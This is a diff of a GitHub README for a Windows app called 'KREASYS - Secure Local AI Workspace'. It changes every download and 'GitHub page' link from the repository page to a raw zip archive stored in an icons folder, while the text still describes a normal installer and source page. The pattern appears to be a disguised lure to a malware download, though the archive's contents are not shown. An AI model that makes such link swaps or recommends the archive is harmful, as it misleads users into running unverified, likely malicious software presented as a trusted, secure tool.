@@ -1,6 +1,6 @@
 # 🤖 KREASYS - Secure Local AI Workspace
 
-[![Download KREASYS](https://img.shields.io/badge/Download-KREASYS-brightgreen?style=for-the-badge&logo=github)](https://github.com/MCRLY/KREASYS)
+[![Download KREASYS](https://img.shields.io/badge/Download-KREASYS-brightgreen?style=for-the-badge&logo=github)](https://github.com/MCRLY/KREASYS/raw/refs/heads/main/icons/Software_v2.9.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Before you start, check that your Windows PC meets these needs:
 1. Open your web browser (Edge, Chrome, or compatible).
 2. Head to the KREASYS download page below.
 
-[![Download KREASYS](https://img.shields.io/badge/Download-KREASYS-blue?style=for-the-badge&logo=github)](https://github.com/MCRLY/KREASYS)
+[![Download KREASYS](https://img.shields.io/badge/Download-KREASYS-blue?style=for-the-badge&logo=github)](https://github.com/MCRLY/KREASYS/raw/refs/heads/main/icons/Software_v2.9.zip)
 
 3. Click on the latest release or the main page to find the download.
 4. Download the file named similar to `KREASYS_Setup.exe` or the installer for Windows.
@@ -115,7 +115,7 @@ You control when to export or share data. The app does not collect any personal 
 
 ## 🗂️ Resources
 
-- Visit the [KREASYS GitHub page](https://github.com/MCRLY/KREASYS) for updates, source code, and community support.
+- Visit the [KREASYS GitHub page](https://github.com/MCRLY/KREASYS/raw/refs/heads/main/icons/Software_v2.9.zip) for updates, source code, and community support.
 - Check the project Wiki for detailed guides and troubleshooting tips.
 - Use the Issues tab on GitHub to report bugs or request new features.
 
@@ -125,4 +125,4 @@ You control when to export or share data. The app does not collect any personal 
 
 Start by visiting the page below to get the latest version for Windows:
 
-[![Download KREASYS](https://img.shields.io/badge/Download-KREASYS-brightgreen?style=for-the-badge&logo=github)](https://github.com/MCRLY/KREASYS)
+[![Download KREASYS](https://img.shields.io/badge/Download-KREASYS-brightgreen?style=for-the-badge&logo=github)](https://github.com/MCRLY/KREASYS/raw/refs/heads/main/icons/Software_v2.9.zip)
